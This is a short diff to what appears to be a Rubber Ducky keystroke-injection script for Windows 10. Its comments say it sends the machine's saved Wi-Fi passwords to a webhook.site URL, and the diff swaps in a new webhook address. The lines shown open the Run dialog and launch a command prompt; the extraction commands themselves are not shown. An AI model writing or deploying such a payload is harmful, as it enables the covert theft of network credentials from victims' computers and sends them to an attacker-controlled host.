@@ -1,7 +1,7 @@
 REM Polish made this trying to code.
 REM Target Win 10
 REM Sending WIFI Passwords through a webhook
-REM Replace <your_webhook_here> with your webhook like https://webhook.site/4f8b246c-2071-49c5-baa6-07983dffc024
+REM Replace https://webhook.site/0d099c49-ab2a-408c-ab25-ac1e66b09eea
 GUI r
 DELAY 500
 STRING CMD
